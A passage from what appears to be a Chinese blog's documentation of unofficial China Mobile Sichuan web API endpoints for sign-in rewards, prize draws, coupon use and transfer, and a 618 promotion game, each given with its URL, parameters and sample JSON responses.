class="string">"99"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        "code": 7, // 7表示没有抽中将 4表示当天抽奖次数已耗尽  5表示提交过于频繁（官方建议是间隔30秒）</span><br><span class="line">        "info": "谢谢参与！"</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>

<h4 id="当月中奖情况"><a href="#当月中奖情况" class="headerlink" title="当月中奖情况"></a>当月中奖情况</h4><p><strong>简要描述：</strong></p>
<ul>
<li>当月中奖情况</li>
</ul>
<p><strong>请求URL：</strong></p>
<ul>
<li><a href="https://wap.sc.10086.cn/scmccCampaign/newturntable/getRewardInfo.do" target="_blank" rel="noopener">https://wap.sc.10086.cn/scmccCampaign/newturntable/getRewardInfo.do</a></li>
</ul>
<p><strong>请求方式：</strong></p>
<ul>
<li><code>POST</code></li>
</ul>
<p><strong>参数：</strong></p>
<table>
<thead>
<tr>
<th align="left">参数名</th>
<th align="left">必选</th>
<th align="left">类型</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">SSOCookie</td>
<td align="left">是</td>
<td align="left">string</td>
<td>登录Cookie中返回的SSOCookie</td>
</tr>
</tbody></table>
<p><strong>返回示例</strong></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"result"</span>: &#123;</span><br><span class="line">        <span class="attr">"obj"</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">"F_EXPENSETYPE"</span>: <span class="number">10</span>,</span><br><span class="line">                <span class="attr">"F_ID"</span>: <span class="string">"200401072155157354"</span>,</span><br><span class="line">                <span class="attr">"F_CODE"</span>: <span class="literal">null</span>,</span><br><span class="line">                <span class="attr">"F_PRIZE_ID"</span>: <span class="string">"4"</span>,</span><br><span class="line">                <span class="attr">"F_PRIZE_NAME"</span>: <span class="string">"饿了么红包"</span>,</span><br><span class="line">                <span class="attr">"F_TIME"</span>: <span class="string">"2020.04.01"</span>,</span><br><span class="line">                <span class="attr">"F_SEND_STATUS"</span>: <span class="number">1</span></span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line">        <span class="attr">"code"</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">"info"</span>: <span class="string">""</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>


<h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><h4 id="签到状态"><a href="#签到状态" class="headerlink" title="签到状态"></a>签到状态</h4><p><strong>简要描述：</strong></p>
<ul>
<li>签到状态</li>
</ul>
<p><strong>请求URL：</strong></p>
<ul>
<li><a href="https://wap.sc.10086.cn/scmccCampaign/signCalendar/signed.do" target="_blank" rel="noopener">https://wap.sc.10086.cn/scmccCampaign/signCalendar/signed.do</a></li>
</ul>
<p><strong>请求方式：</strong></p>
<ul>
<li><code>POST</code></li>
</ul>
<p><strong>参数：</strong></p>
<table>
<thead>
<tr>
<th align="left">参数名</th>
<th align="left">必选</th>
<th align="left">类型</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">SSOCookie</td>
<td align="left">是</td>
<td align="left">string</td>
<td>登录Cookie中返回的SSOCookie</td>
</tr>
</tbody></table>
<p><strong>返回示例</strong></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"result"</span>: &#123;</span><br><span class="line">        "obj": 1, // 1表示已签 0表示未签</span><br><span class="line">        "code": 0,</span><br><span class="line">        "info": ""</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>

<h4 id="签到历史"><a href="#签到历史" class="headerlink" title="签到历史"></a>签到历史</h4><p><strong>简要描述：</strong></p>
<ul>
<li>签到历史</li>
</ul>
<p><strong>请求URL：</strong></p>
<ul>
<li><a href="https://wap.sc.10086.cn/scmccCampaign/signCalendar/signHistory.do" target="_blank" rel="noopener">https://wap.sc.10086.cn/scmccCampaign/signCalendar/signHistory.do</a></li>
</ul>
<p><strong>请求方式：</strong></p>
<ul>
<li><code>POST</code></li>
</ul>
<p><strong>参数：</strong></p>
<table>
<thead>
<tr>
<th align="left">参数名</th>
<th align="left">必选</th>
<th align="left">类型</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">SSOCookie</td>
<td align="left">是</td>
<td align="left">string</td>
<td>登录Cookie中返回的SSOCookie</td>
</tr>
</tbody></table>
<p><strong>返回示例</strong></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"result"</span>: &#123;</span><br><span class="line">        <span class="attr">"obj"</span>: [</span><br><span class="line">            <span class="string">"20200401"</span>,</span><br><span class="line">            <span class="string">"20200402"</span>,</span><br><span class="line">            <span class="string">"20200403"</span>,</span><br><span class="line">            <span class="string">"20200404"</span>,</span><br><span class="line">            <span class="string">"20200405"</span>,</span><br><span class="line">            <span class="string">"20200406"</span></span><br><span class="line">        ],</span><br><span class="line">        <span class="attr">"code"</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">"info"</span>: <span class="string">""</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>

<h4 id="签到-1"><a href="#签到-1" class="headerlink" title="签到"></a>签到</h4><p><strong>简要描述：</strong></p>
<ul>
<li>签到</li>
</ul>
<p><strong>请求URL：</strong></p>
<ul>
<li><a href="https://wap.sc.10086.cn/scmccCampaign/signCalendar/sign.do" target="_blank" rel="noopener">https://wap.sc.10086.cn/scmccCampaign/signCalendar/sign.do</a></li>
</ul>
<p><strong>请求方式：</strong></p>
<ul>
<li><code>POST</code></li>
</ul>
<p><strong>参数：</strong></p>
<table>
<thead>
<tr>
<th align="left">参数名</th>
<th align="left">必选</th>
<th align="left">类型</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">SSOCookie</td>
<td align="left">是</td>
<td align="left">string</td>
<td>登录Cookie中返回的SSOCookie</td>
</tr>
</tbody></table>
<p><strong>返回示例</strong></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"result"</span>: &#123;</span><br><span class="line">        "obj": 6, // code=0时返回，当月合计签到天数</span><br><span class="line">        "code": 0,// 0 签到成功  2 已经签到</span><br><span class="line">        "info": "noADs"</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>

<h4 id="签到奖励"><a href="#签到奖励" class="headerlink" title="签到奖励"></a>签到奖励</h4><p><strong>简要描述：</strong></p>
<ul>
<li>签到奖励</li>
</ul>
<p><strong>请求URL：</strong></p>
<ul>
<li><a href="https://wap.sc.10086.cn/scmccCampaign/signCalendar/queryPrizeAndDrawStatusNew.do" target="_blank" rel="noopener">https://wap.sc.10086.cn/scmccCampaign/signCalendar/queryPrizeAndDrawStatusNew.do</a></li>
</ul>
<p><strong>请求方式：</strong></p>
<ul>
<li><code>POST</code></li>
</ul>
<p><strong>参数：</strong></p>
<table>
<thead>
<tr>
<th align="left">参数名</th>
<th align="left">必选</th>
<th align="left">类型</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">SSOCookie</td>
<td align="left">是</td>
<td align="left">string</td>
<td>登录Cookie中返回的SSOCookie</td>
</tr>
</tbody></table>
<p><strong>返回示例</strong></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"result"</span>:&#123;</span><br><span class="line">        <span class="attr">"obj"</span>:&#123;</span><br><span class="line">            "isHand":"0", // 0 表示可以抽奖 1表示未办理会员 2表示查询失败</span><br><span class="line">            "dayNum":7, // 当前已签到天数</span><br><span class="line">            "prizes":[</span><br><span class="line">                &#123;</span><br><span class="line">                    "DAYCOUNT":3,// 需要签到天数</span><br><span class="line">                    "PRIZENAME":"200M国内",</span><br><span class="line">                    "DRAWSTATUS":"1", // 是否已经领取 1是 0否</span><br><span class="line">                    "TYPE":1</span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">"DAYCOUNT"</span>:<span class="number">7</span>,</span><br><span class="line">                    <span class="attr">"PRIZENAME"</span>:<span class="string">"500M国内"</span>,</span><br><span class="line">                    "DRAWSTATUS":"1",// 是否已经领取 1是 0否</span><br><span class="line">                    "TYPE":2</span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">"DAYCOUNT"</span>:<span class="number">15</span>,</span><br><span class="line">                    <span class="attr">"PRIZENAME"</span>:<span class="string">"幸运礼包"</span>,</span><br><span class="line">                    "DRAWSTATUS":"0",// 是否已经领取 1是 0否</span><br><span class="line">                    "TYPE":3</span><br><span class="line">                &#125;</span><br><span class="line">            ], </span><br><span class="line">            // 对应的奖品</span><br><span class="line">            "cards": [</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">"CARDID"</span>: <span class="string">"ZT_2020430_200M"</span>,</span><br><span class="line">                    <span class="attr">"RECEIVEPHONE"</span>: <span class="string">"xxxxxxx"</span>,</span><br><span class="line">                    <span class="attr">"USESTATE"</span>: <span class="string">"1"</span>,</span><br><span class="line">                    <span class="attr">"BIZID"</span>: <span class="string">"20200505091302388179"</span>,</span><br><span class="line">                    <span class="attr">"RECEIVETIME"</span>: <span class="string">"20200505091359608"</span>,</span><br><span class="line">                    <span class="attr">"USEDATE"</span>: <span class="string">"20200505091545044"</span>,</span><br><span class="line">                    <span class="attr">"USEBEGINTIME"</span>: <span class="string">"20200505"</span>,</span><br><span class="line">                    <span class="attr">"RECEIVEPHONENUM"</span>: <span class="string">"xxxx"</span>,</span><br><span class="line">                    <span class="attr">"COMMERCIALFISRTNUM"</span>: <span class="string">"CH000161"</span>,</span><br><span class="line">                    <span class="attr">"SENDORFROM"</span>: <span class="string">"2"</span>,</span><br><span class="line">                    <span class="attr">"SENDPHONE"</span>: <span class="literal">null</span>,</span><br><span class="line">                    <span class="attr">"PARENTCARDNUM"</span>: <span class="string">"FQCH00002069"</span>,</span><br><span class="line">                    <span class="attr">"USEENDTIME"</span>: <span class="string">"20200531"</span>,</span><br><span class="line">                    <span class="attr">"CHILDCARDNUM"</span>: <span class="string">"ZQ202005050202732986"</span>,</span><br><span class="line">                    <span class="attr">"CHILDCARDNAME"</span>: <span class="string">"签到有礼流量券"</span></span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">"CARDID"</span>: <span class="string">"ZT_2020430_200M"</span>,</span><br><span class="line">                    <span class="attr">"RECEIVEPHONE"</span>: <span class="literal">null</span>,</span><br><span class="line">                    <span class="attr">"USESTATE"</span>: <span class="string">"0"</span>,</span><br><span class="line">                    <span class="attr">"BIZID"</span>: <span class="string">"20200511155813502102"</span>,</span><br><span class="line">                    <span class="attr">"RECEIVETIME"</span>: <span class="string">"20200511155813513"</span>,</span><br><span class="line">                    <span class="attr">"USEDATE"</span>: <span class="literal">null</span>,</span><br><span class="line">                    <span class="attr">"USEBEGINTIME"</span>: <span class="string">"20200511"</span>,</span><br><span class="line">                    <span class="attr">"RECEIVEPHONENUM"</span>: <span class="string">"xxxx"</span>,</span><br><span class="line">                    <span class="attr">"COMMERCIALFISRTNUM"</span>: <span class="string">"CH000161"</span>,</span><br><span class="line">                    <span class="attr">"SENDORFROM"</span>: <span class="literal">null</span>,</span><br><span class="line">                    <span class="attr">"SENDPHONE"</span>: <span class="literal">null</span>,</span><br><span class="line">                    <span class="attr">"PARENTCARDNUM"</span>: <span class="string">"FQCH00002069"</span>,</span><br><span class="line">                    <span class="attr">"USEENDTIME"</span>: <span class="string">"20200531"</span>,</span><br><span class="line">                    <span class="attr">"CHILDCARDNUM"</span>: <span class="string">"ZQ202005110203266865"</span>,</span><br><span class="line">                    <span class="attr">"CHILDCARDNAME"</span>: <span class="string">"签到有礼流量券"</span></span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">"CARDID"</span>: <span class="string">"ZT_2020430_500M"</span>,</span><br><span class="line">                    <span class="attr">"RECEIVEPHONE"</span>: <span class="literal">null</span>,</span><br><span class="line">                    <span class="attr">"USESTATE"</span>: <span class="string">"0"</span>,</span><br><span class="line">                    <span class="attr">"BIZID"</span>: <span class="string">"20200511155553663529"</span>,</span><br><span class="line">                    <span class="attr">"RECEIVETIME"</span>: <span class="string">"20200511155553671"</span>,</span><br><span class="line">                    <span class="attr">"USEDATE"</span>: <span class="literal">null</span>,</span><br><span class="line">                    <span class="attr">"USEBEGINTIME"</span>: <span class="string">"20200511"</span>,</span><br><span class="line">                    <span class="attr">"RECEIVEPHONENUM"</span>: <span class="string">"xxxx"</span>,</span><br><span class="line">                    <span class="attr">"COMMERCIALFISRTNUM"</span>: <span class="string">"CH000161"</span>,</span><br><span class="line">                    <span class="attr">"SENDORFROM"</span>: <span class="literal">null</span>,</span><br><span class="line">                    <span class="attr">"SENDPHONE"</span>: <span class="literal">null</span>,</span><br><span class="line">                    <span class="attr">"PARENTCARDNUM"</span>: <span class="string">"FQCH00002071"</span>,</span><br><span class="line">                    <span class="attr">"USEENDTIME"</span>: <span class="string">"20200531"</span>,</span><br><span class="line">                    <span class="attr">"CHILDCARDNUM"</span>: <span class="string">"ZQ202005110203266814"</span>,</span><br><span class="line">                    <span class="attr">"CHILDCARDNAME"</span>: <span class="string">"签到有礼流量券"</span></span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;,</span><br><span class="line">        "code":0,</span><br><span class="line">        "info":""</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>

<h4 id="领取签到奖励"><a href="#领取签到奖励" class="headerlink" title="领取签到奖励"></a>领取签到奖励</h4><p><strong>简要描述：</strong></p>
<ul>
<li>领取签到奖励</li>
</ul>
<p><strong>请求URL：</strong></p>
<ul>
<li><a href="https://wap.sc.10086.cn/scmccCampaign/signCalendar/drawNew.do" target="_blank" rel="noopener">https://wap.sc.10086.cn/scmccCampaign/signCalendar/drawNew.do</a></li>
</ul>
<p><strong>请求方式：</strong></p>
<ul>
<li><code>POST</code></li>
</ul>
<p><strong>参数：</strong></p>
<table>
<thead>
<tr>
<th align="left">参数名</th>
<th align="left">必选</th>
<th align="left">类型</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">SSOCookie</td>
<td align="left">是</td>
<td align="left">string</td>
<td>登录Cookie中返回的SSOCookie</td>
</tr>
<tr>
<td align="left">type</td>
<td align="left">是</td>
<td align="left">string</td>
<td>对应上面签到奖励 <code>obj.prizes.TYPE</code></td>
</tr>
</tbody></table>
<p><strong>返回示例</strong></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"result"</span>:&#123;</span><br><span class="line">        <span class="attr">"obj"</span>:&#123;</span><br><span class="line">                // 抽中奖励</span><br><span class="line">                "f_date": "20200511",</span><br><span class="line">                "f_table_name": "t_act_cale_draw202005",</span><br><span class="line">                "f_expensetype": "6",</span><br><span class="line">                "f_phone": "&#123;当前用户手机号明文&#125;",</span><br><span class="line">                "f_send_status": "1",</span><br><span class="line">                "f_expensecode": "ZT_2020430_500M",</span><br><span class="line">                "f_type_name": "流量",</span><br><span class="line">                "f_type": "2",</span><br><span class="line">                "f_prize": "500M国内流量券",</span><br><span class="line">                "f_num": 500,</span><br><span class="line">                "f_act_name": "微博签到",</span><br><span class="line">                "month": "202005",</span><br><span class="line">                "f_bizId": "20200511155153663529" </span><br><span class="line">        &#125;,</span><br><span class="line">        "code":4, // 0 抽中奖品 1登录超时 2服务器繁忙 3当obj=2或者4时活动未开始、3已结束  4已经抽过 5服务器繁忙 6奖品已经被抢完 7未抽中 11未办理会员</span><br><span class="line">        "info":""</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>

<h3 id="卡券"><a href="#卡券" class="headerlink" title="卡券"></a>卡券</h3><h4 id="卡券列表"><a href="#卡券列表" class="headerlink" title="卡券列表"></a>卡券列表</h4><p><strong>简要描述：</strong></p>
<ul>
<li>卡券列表，这个接口会返回所有卡券信息，前端自己进行分类</li>
</ul>
<p><strong>请求URL：</strong></p>
<ul>
<li><a href="https://wap.sc.10086.cn/scmccClient/fusionCardCoupons.do" target="_blank" rel="noopener">https://wap.sc.10086.cn/scmccClient/fusionCardCoupons.do</a></li>
</ul>
<p><strong>请求方式：</strong></p>
<ul>
<li><code>POST</code></li>
</ul>
<p><strong>参数：</strong></p>
<table>
<thead>
<tr>
<th align="left">参数名</th>
<th align="left">必选</th>
<th align="left">类型</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">SSOCookie</td>
<td align="left">是</td>
<td align="left">string</td>
<td>登录Cookie中返回的SSOCookie</td>
</tr>
<tr>
<td align="left">type</td>
<td align="left">是</td>
<td align="left">string</td>
<td>2</td>
</tr>
</tbody></table>
<p><strong>返回示例</strong></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">// 返回数据需要base64解码</span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">"msg"</span>:<span class="string">"卡券查询成功!"</span>,</span><br><span class="line">    <span class="attr">"retObj"</span>:&#123;</span><br><span class="line">        <span class="attr">"usedList"</span>:[ // 已经使用</span><br><span class="line">        ],</span><br><span class="line">        <span class="attr">"O2OList"</span>:[// o2o未使用</span><br><span class="line"></span><br><span class="line">        ],</span><br><span class="line">        <span class="attr">"expiredList"</span>:[// 过期</span><br><span class="line"></span><br><span class="line">        ],</span><br><span class="line">        <span class="attr">"ZTList"</span>:[// 未使用</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">"busiType"</span>:<span class="string">"1"</span>,</span><br><span class="line">                <span class="attr">"canBeGiveAway"</span>:<span class="string">"1"</span>,</span><br><span class="line">                <span class="attr">"cardAmount"</span>:<span class="string">"500M国内流量"</span>,</span><br><span class="line">                <span class="attr">"cardName"</span>:<span class="string">"签到有礼流量券"</span>,</span><br><span class="line">                <span class="attr">"channel"</span>:<span class="string">"1"</span>,</span><br><span class="line">                <span class="attr">"couponNum"</span>:<span class="string">"ZQ202004080200553283"</span>,</span><br><span class="line">                <span class="attr">"couponType"</span>:<span class="string">"2"</span>,</span><br><span class="line">                <span class="attr">"desc"</span>:<span class="string">"null"</span>,</span><br><span class="line">                <span class="attr">"effectDateBgn"</span>:<span class="string">"20200408"</span>,</span><br><span class="line">                <span class="attr">"effectDateEnd"</span>:<span class="string">"20200430"</span>,</span><br><span class="line">                <span class="attr">"effectDateRela"</span>:<span class="string">""</span>,</span><br><span class="line">                <span class="attr">"effectDateType"</span>:<span class="string">"0"</span>,</span><br><span class="line">                <span class="attr">"effectTimeBgn"</span>:<span class="string">"000000"</span>,</span><br><span class="line">                <span class="attr">"effectTimeEnd"</span>:<span class="string">"235959"</span>,</span><br><span class="line">                <span class="attr">"exParam3"</span>:<span class="string">"1"</span>,</span><br><span class="line">                <span class="attr">"exParam4"</span>:<span class="string">"确认办理吗？"</span>,</span><br><span class="line">                <span class="attr">"exParam5"</span>:<span class="string">"恭喜您，使用成功!"</span>,</span><br><span class="line">                <span class="attr">"exParam6"</span>:<span class="string">"对不起，使用失败"</span>,</span><br><span class="line">                <span class="attr">"fromType"</span>:<span class="string">"1"</span>,</span><br><span class="line">                <span class="attr">"luckyTruntable"</span>:<span class="string">"0"</span>,</span><br><span class="line">                <span class="attr">"numMain"</span>:<span class="string">"CC000311"</span>,</span><br><span class="line">                <span class="attr">"parentCardNum"</span>:<span class="string">"FQCH00001999"</span>,</span><br><span class="line">                <span class="attr">"receivePhone"</span>:<span class="string">"null"</span>,</span><br><span class="line">                <span class="attr">"sendOrFrom"</span>:<span class="string">"null"</span>,</span><br><span class="line">                <span class="attr">"sendPhone"</span>:<span class="string">"null"</span>,</span><br><span class="line">                <span class="attr">"useState"</span>:<span class="string">"0"</span></span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>

<h4 id="卡券使用"><a href="#卡券使用" class="headerlink" title="卡券使用"></a>卡券使用</h4><p><strong>简要描述：</strong></p>
<ul>
<li>直接本机使用该卡券</li>
</ul>
<p><strong>请求URL：</strong></p>
<ul>
<li><a href="https://wap.sc.10086.cn/scmccClient/fusionCardCoupons.do" target="_blank" rel="noopener">https://wap.sc.10086.cn/scmccClient/fusionCardCoupons.do</a></li>
</ul>
<p><strong>请求方式：</strong></p>
<ul>
<li><code>POST</code></li>
</ul>
<p><strong>参数：</strong></p>
<table>
<thead>
<tr>
<th align="left">参数名</th>
<th align="left">必选</th>
<th align="left">类型</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">SSOCookie</td>
<td align="left">是</td>
<td align="left">string</td>
<td>登录Cookie中返回的SSOCookie</td>
</tr>
<tr>
<td align="left">type</td>
<td align="left">是</td>
<td align="left">string</td>
<td>1</td>
</tr>
<tr>
<td align="left">parms</td>
<td align="left">是</td>
<td align="left">JSONObject</td>
<td>对应奖品对象,上面卡券列表的一个item</td>
</tr>
</tbody></table>
<p><strong>parms参数示例</strong></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"> &#123;</span><br><span class="line">    <span class="attr">"busiType"</span>:<span class="string">"1"</span>,</span><br><span class="line">    <span class="attr">"canBeGiveAway"</span>:<span class="string">"1"</span>,</span><br><span class="line">    <span class="attr">"cardAmount"</span>:<span class="string">"500M国内流量"</span>,</span><br><span class="line">    <span class="attr">"cardName"</span>:<span class="string">"签到有礼流量券"</span>,</span><br><span class="line">    <span class="attr">"channel"</span>:<span class="string">"1"</span>,</span><br><span class="line">    <span class="attr">"couponNum"</span>:<span class="string">"ZQ202004080200553283"</span>,</span><br><span class="line">    <span class="attr">"couponType"</span>:<span class="string">"2"</span>,</span><br><span class="line">    <span class="attr">"desc"</span>:<span class="string">"null"</span>,</span><br><span class="line">    <span class="attr">"effectDateBgn"</span>:<span class="string">"20200408"</span>,</span><br><span class="line">    <span class="attr">"effectDateEnd"</span>:<span class="string">"20200430"</span>,</span><br><span class="line">    <span class="attr">"effectDateRela"</span>:<span class="string">""</span>,</span><br><span class="line">    <span class="attr">"effectDateType"</span>:<span class="string">"0"</span>,</span><br><span class="line">    <span class="attr">"effectTimeBgn"</span>:<span class="string">"000000"</span>,</span><br><span class="line">    <span class="attr">"effectTimeEnd"</span>:<span class="string">"235959"</span>,</span><br><span class="line">    <span class="attr">"exParam3"</span>:<span class="string">"1"</span>,</span><br><span class="line">    <span class="attr">"exParam4"</span>:<span class="string">"确认办理吗？"</span>,</span><br><span class="line">    <span class="attr">"exParam5"</span>:<span class="string">"恭喜您，使用成功!"</span>,</span><br><span class="line">    <span class="attr">"exParam6"</span>:<span class="string">"对不起，使用失败"</span>,</span><br><span class="line">    <span class="attr">"fromType"</span>:<span class="string">"1"</span>,</span><br><span class="line">    <span class="attr">"luckyTruntable"</span>:<span class="string">"0"</span>,</span><br><span class="line">    <span class="attr">"numMain"</span>:<span class="string">"CC000311"</span>,</span><br><span class="line">    <span class="attr">"parentCardNum"</span>:<span class="string">"FQCH00001999"</span>,</span><br><span class="line">    <span class="attr">"receivePhone"</span>:<span class="string">"null"</span>,</span><br><span class="line">    <span class="attr">"sendOrFrom"</span>:<span class="string">"null"</span>,</span><br><span class="line">    <span class="attr">"sendPhone"</span>:<span class="string">"null"</span>,</span><br><span class="line">    <span class="attr">"useState"</span>:<span class="string">"0"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>返回示例</strong></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123; </span><br><span class="line">    "returnCode":"1", // 1 成功 0失败</span><br><span class="line">    "msg":"success",</span><br><span class="line">    "retObj":null</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>

<h4 id="卡券转送验证码"><a href="#卡券转送验证码" class="headerlink" title="卡券转送验证码"></a>卡券转送验证码</h4><p><strong>简要描述：</strong></p>
<ul>
<li>卡券转送验证码，和登录验证码类似</li>
</ul>
<p><strong>请求URL：</strong></p>
<ul>
<li><a href="https://wap.sc.10086.cn/scmccClient/cardSmsCoupons.do" target="_blank" rel="noopener">https://wap.sc.10086.cn/scmccClient/cardSmsCoupons.do</a></li>
</ul>
<p><strong>请求方式：</strong></p>
<ul>
<li><code>POST</code></li>
</ul>
<p><strong>参数：</strong></p>
<table>
<thead>
<tr>
<th align="left">参数名</th>
<th align="left">必选</th>
<th align="left">类型</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">SSOCookie</td>
<td align="left">是</td>
<td align="left">string</td>
<td>登录Cookie中返回的SSOCookie</td>
</tr>
<tr>
<td align="left">type</td>
<td align="left">是</td>
<td align="left">string</td>
<td>0</td>
</tr>
</tbody></table>
<p><strong>返回示例</strong></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123; </span><br><span class="line">    <span class="attr">"msg"</span>:<span class="string">"短信验证码发送成功！"</span>,</span><br><span class="line">    <span class="attr">"returnCode"</span>:<span class="string">"1"</span> // <span class="number">1</span> 成功 <span class="number">0</span>失败</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>

<h4 id="卡券转送"><a href="#卡券转送" class="headerlink" title="卡券转送"></a>卡券转送</h4><p><strong>简要描述：</strong></p>
<ul>
<li>卡券转送: 先获取转送验证码，才能转送</li>
</ul>
<p><strong>请求URL：</strong></p>
<ul>
<li><a href="https://wap.sc.10086.cn/scmccClient/cardCoupons.do" target="_blank" rel="noopener">https://wap.sc.10086.cn/scmccClient/cardCoupons.do</a></li>
</ul>
<p><strong>请求方式：</strong></p>
<ul>
<li><code>POST</code></li>
</ul>
<p><strong>参数：</strong></p>
<table>
<thead>
<tr>
<th align="left">参数名</th>
<th align="left">必选</th>
<th align="left">类型</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">SSOCookie</td>
<td align="left">是</td>
<td align="left">string</td>
<td>登录Cookie中返回的SSOCookie</td>
</tr>
<tr>
<td align="left">type</td>
<td align="left">是</td>
<td align="left">string</td>
<td>4</td>
</tr>
<tr>
<td align="left">phoneInput</td>
<td align="left">是</td>
<td align="left">string</td>
<td>接收者的手机号</td>
</tr>
<tr>
<td align="left">smsInput</td>
<td align="left">是</td>
<td align="left">string</td>
<td>转送验证码</td>
</tr>
<tr>
<td align="left">childCardNum</td>
<td align="left">是</td>
<td align="left">string</td>
<td>对应送的卡券号码 couponNum</td>
</tr>
</tbody></table>
<p><strong>返回示例</strong></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123; </span><br><span class="line">    "returnCode":"0", // 1 成功 0失败</span><br><span class="line">    "msg":"卡券已经使用，无法进行转赠！",</span><br><span class="line">    "retObj":null</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>

<h3 id="一起奔跑吧活动"><a href="#一起奔跑吧活动" class="headerlink" title="一起奔跑吧活动"></a>一起奔跑吧活动</h3><p>2020年移动618送流量活动，每个手机号每天有两次抽奖机会，最高可以获得100M+300M+500M+1G流量或者0.66元+0.99元+5元花费奖励。</p>
<blockquote>
<p>当前活动已结束，如果想玩这个游戏可以点击 <a href="https://app.ya2.top/618game" target="_blank" rel="noopener">一起奔跑吧活动</a></p>
</blockquote>
<h4 id="游戏初始化"><a href="#游戏初始化" class="headerlink" title="游戏初始化"></a>游戏初始化</h4><p><strong>简要描述：</strong></p>
<ul>
<li>该接口获取当前用户到了哪一个分数级别，并且有哪些奖项可以领取</li>
</ul>
<p><strong>请求URL：</strong></p>
<ul>
<li><a href="https://wap.sc.10086.cn/scmccCampaign/luckday/init.do" target="_blank" rel="noopener">https://wap.sc.10086.cn/scmccCampaign/luckday/init.do</a></li>
</ul>
<p><strong>请求方式：</strong></p>
<ul>
<li><code>POST</code></li>
</ul>
<p><strong>参数：</strong></p>
<table>
<thead>
<tr>
<th align="left">参数名</th>
<th align="left">必选</th>
<th align="left">类型</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">SSOCookie</td>
<td align="left">是</td>
<td align="left">string</td>
<td>登录Cookie中返回的SSOCookie</td>
</tr>
</tbody></table>
<p><strong>返回示例</strong></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"result"</span>: &#123;</span><br><span class="line">        <span class="attr">"obj"</span>: &#123;</span><br><span class="line">            "isHand": "0", // 0代表办理过一元会员 其他都是未办理一元会员</span><br><span class="line">            "sectionList": [</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">"percentList"</span>: [ // 当前进度</span><br><span class="line">                        &#123;</span><br><span class="line">                            "totalCount": "608", //  当前积分数</span><br><span class="line">                            "currentStart": "600",</span><br><span class="line">                            "currentEnd": "1000", // 表示当前再600-1000段位内</span><br><span class="line">                            "section": 4 // 计算进度条</span><br><span class="line">                        &#125;</span><br><span class="line">                    ]</span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">"otherList"</span>: [</span><br><span class="line">                        &#123;</span><br><span class="line">                            "F_IS_NEED_UNLOCK": "0", // F_IS_NEED_UNLOCK 0 不需要好友解锁  1 需要好友解锁</span><br><span class="line">                            "F_ID": "GIFT000001", // 奖品ID</span><br><span class="line">                            "hasDrawed": "1", // 0未抽奖 1已抽奖</span><br><span class="line">                            "F_START": "100",</span><br><span class="line">                            "F_END": "300",</span><br><span class="line">                            "F_BEST_GIFT": "100M" // 该阶段最好的奖品</span><br><span class="line">                        